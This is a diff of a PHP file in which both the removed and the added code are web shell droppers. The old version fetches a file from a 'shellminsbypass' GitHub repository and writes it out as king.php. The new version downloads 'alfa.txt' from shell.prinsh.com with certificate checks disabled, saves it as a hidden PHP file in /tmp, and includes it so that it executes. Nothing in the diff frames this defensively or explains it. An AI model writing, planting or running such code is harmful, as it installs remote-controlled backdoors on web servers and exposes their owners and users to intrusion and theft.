@@ -1,23 +1,22 @@
 <?php
-function http_get($url){
-	$im = curl_init($url);
-	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
-	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
-	curl_setopt($im, CURLOPT_HEADER, 0);
-	return curl_exec($im);
-	curl_close($im);
+$data = ['https://shell.prinsh.com/Nathan/alfa.txt', '/tmp/sesss_'.md5($_SERVER['HTTP_HOST']).'.php'];
+ 
+if(file_exists($data[1]) && filesize($data[1]) !== 0) {
+    include($data[1]);
+} else {
+    $fopen = fopen($data[1], 'w+');
+    fwrite($fopen, get($data[0]));
+    fclose($fopen);
+    echo '<script>window.location="?zet";</script>';
 }
-$s = http_get('https://raw.githubusercontent.com/kingfaouzizky/shellminsbypass/main/alfabet');
-$check = getcwd() . "/king.php";
-$text = $s;
-$open = fopen($check, 'w');
-fwrite($open, $text);
-fclose($open);
-if(file_exists($check)){
-    echo $check."</br>";
-}else 
-  echo "not exits";
-echo "done .n " ;
-
+ 
+function get($url) {
+    $ch = curl_init();
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+          curl_setopt($ch, CURLOPT_URL, $url);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+    return curl_exec($ch);
+          curl_close($ch);
+}
 ?>
